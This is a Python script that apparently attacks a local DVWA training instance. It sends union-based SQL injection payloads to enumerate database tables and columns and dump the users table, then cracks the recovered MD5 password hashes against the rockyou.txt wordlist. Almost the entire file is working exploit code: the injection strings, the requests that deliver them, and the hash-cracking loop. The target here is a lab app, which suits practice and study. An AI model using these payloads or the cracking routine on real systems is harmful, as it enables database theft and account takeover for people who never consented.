import requests 
from bs4 import BeautifulSoup
from requests.utils import requote_uri
from hashlib import md5
import sys
from termcolor import colored
cookies = {
	"__stripe_mid": "37d68129-f74e-428b-90ce-72715d2b34fa",
	"PHPSESSID": "jl8h4o0kvofc4nji8okhbjpc4e",
	"security": "low"}

url = "http://localhost:8080/DVWA-master/vulnerabilities/sqli/?id={}&Submit=Submit#"

def getTableName(url , cookies) :
    GetTableNamePayload =  "1'union select 1,GROUP_CONCAT(table_schema,':',table_name)FROM information_Schema.tables  -- -"
    data = requests.get(url.format(requote_uri(GetTableNamePayload)) , cookies=cookies)
    soup = BeautifulSoup(data.content , 'html.parser')
    print(soup.find_all('pre')[1].get_text()[116:])

def getColumnName(url , cookies) :
    GetColumnNamePayload =  "1'union select 1,GROUP_CONCAT(table_schema , ':',column_name)FROM information_Schema.columns where table_name = 'users'  -- -"
    data = requests.get(url.format(requote_uri(GetColumnNamePayload)) , cookies=cookies)
    soup = BeautifulSoup(data.content , 'html.parser')
    print(soup.find_all('pre')[1].get_text())

def getAllUser(url , cookies):
    GetAllUserPayload = "1 ' or 1=1 -- -"
    data =  requests.get(url.format(requote_uri(GetAllUserPayload)), cookies=cookies)
    soup = BeautifulSoup(data.content , 'html.parser')

    for i in soup.find_all('pre') :print( ''.join (i.get_text().replace("' or 1=1 -- -" , "")) , end='\n')

def dumpUsersTable(url , cookies) :
    users = []
    passwords = []
    GetUserAndPasswordPayload =  "'union select 1,GROUP_CONCAT(user , ':',password)FROM users -- -"
    GetUserPayload =  "'union select 1,user FROM users -- -"
    GetPasswordPayload =  "'union select 1,password FROM users -- -"

    data = requests.get(url.format(requote_uri(GetUserAndPasswordPayload)) , cookies=cookies)
    user = requests.get(url.format(requote_uri(GetUserPayload)) , cookies=cookies)
    password = requests.get(url.format(requote_uri(GetPasswordPayload)) , cookies=cookies)
    soup = BeautifulSoup(data.content , 'html.parser')
    soupUser = BeautifulSoup(user.content , 'html.parser')
    soupPassword = BeautifulSoup(password.content , 'html.parser')
    (password.content , 'html.parser')

    for i  in range(0,4) :
        try :
            users.append (soupUser.find_all('pre')[i].get_text()[62:])
            passwords.append(soupPassword.find_all('pre')[i].get_text()[65:].strip())
        except IndexError as err : 
            print(err)
    return   users , passwords



def BruteForce(listsPassword  , passwordWentCrack) :
    i = 0
    with open(listsPassword , 'r' , encoding="utf-8") as passwords :
            while i <  len(passwordWentCrack[1])  :
                for password in passwords :
                    hash = md5(password.replace("\n" ,"").encode()).hexdigest()
                    sys.stdout.write(f"\r{hash}:")
                    try :
                        if hash == passwordWentCrack[1][i]:
                            sys.stdout.flush()
                            print(f"{colored(passwordWentCrack[0][i] , 'green')}:{colored(password , 'green')}" , end="")
                            i+=1 
                            if i > 3 :exit()
                    except:
                        print("password not found")
                        





getAllUser(url , cookies)
getTableName(url , cookies)
getColumnName(url , cookies)
BruteForce('rockyou.txt' , dumpUsersTable(url , cookies))

